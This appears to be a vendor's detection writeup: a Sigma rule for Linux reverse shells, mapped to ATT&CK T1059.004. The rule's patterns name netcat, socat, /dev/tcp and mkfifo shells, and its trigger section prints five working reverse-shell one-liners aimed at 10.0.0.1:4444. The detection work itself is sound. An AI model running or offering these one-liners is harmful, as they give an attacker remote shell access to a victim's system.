# Linux Reverse Shell Detection

Detects common reverse shell techniques on Linux systems: bash /dev/tcp, Python pty.spawn, Perl socket, netcat listeners, socat, and mknod-based shells. Reverse shells are the primary initial foothold technique after exploiting a web application, vulnerable service, or misconfigured container.

## ATT&CK

- **Technique:** T1059.004 — Command and Script Interpreter: Unix Shell
- **Tactic:** Execution

## Severity

**Critical.** A reverse shell is active remote access. The attacker has code execution and is connected to the system right now.

## Detection

```yaml
title: Linux Reverse Shell Execution
id: a4d7e832-c519-4f6a-b231-d8e9f5c74a12
status: experimental
description: >
  Detects common Linux reverse shell techniques including bash
  /dev/tcp, Python pty.spawn, Perl, netcat, socat, and Ruby
  reverse shells.
references:
  - https://attack.mitre.org/techniques/T1059/004/
author: Ridgeline Cyber
date: 2025/05/25
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
detection:
  selection_bash_devtcp:
    CommandLine|contains:
      - '/dev/tcp/'
      - '/dev/udp/'
  selection_bash_redirect:
    CommandLine|contains|all:
      - 'bash'
      - '>&'
      - '/dev/'
  selection_python:
    CommandLine|contains:
      - 'pty.spawn'
      - 'socket.socket'
      - 'subprocess.call'
      - 'os.dup2'
    Image|endswith:
      - '/python'
      - '/python2'
      - '/python3'
  selection_perl:
    CommandLine|contains|all:
      - 'perl'
      - 'socket'
      - 'exec'
  selection_netcat:
    CommandLine|contains:
      - ' -e /bin/sh'
      - ' -e /bin/bash'
      - ' -c /bin/sh'
      - ' -c /bin/bash'
    Image|endswith:
      - '/nc'
      - '/ncat'
      - '/netcat'
      - '/nc.traditional'
      - '/nc.openbsd'
  selection_socat:
    CommandLine|contains:
      - 'socat'
      - 'EXEC:'
      - 'TCP:'
    Image|endswith:
      - '/socat'
  selection_ruby:
    CommandLine|contains|all:
      - 'ruby'
      - 'TCPSocket'
      - 'exec'
  selection_php:
    CommandLine|contains:
      - "php -r"
      - "fsockopen"
      - "exec('/bin/"
  selection_mkfifo:
    CommandLine|contains|all:
      - 'mkfifo'
      - '/tmp/'
      - 'cat'
  selection_openssl:
    CommandLine|contains|all:
      - 'openssl'
      - 's_client'
      - 'connect'
      - '/bin/'
  condition: 1 of selection_*
falsepositives:
  - Legitimate system administration scripts using /dev/tcp for health checks
  - Development environments with socket-based test scripts
  - Authorized penetration testing
level: critical
```

## What Triggers This

Any of the common reverse shell one-liners:
- `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
- `python3 -c 'import socket,subprocess,os;...'`
- `nc -e /bin/bash 10.0.0.1 4444`
- `mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f`
- `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444`

## Learn More

- [Linux IR — Initial Access and Execution](https://ridgelinecyber.com/training/courses/linux-endpoint-investigation/) — reverse shell identification and containment
- [Offensive Security for Defenders — Linux Exploitation](https://ridgelinecyber.com/training/courses/offensive-security-for-defenders/) — reverse shell techniques and their telemetry
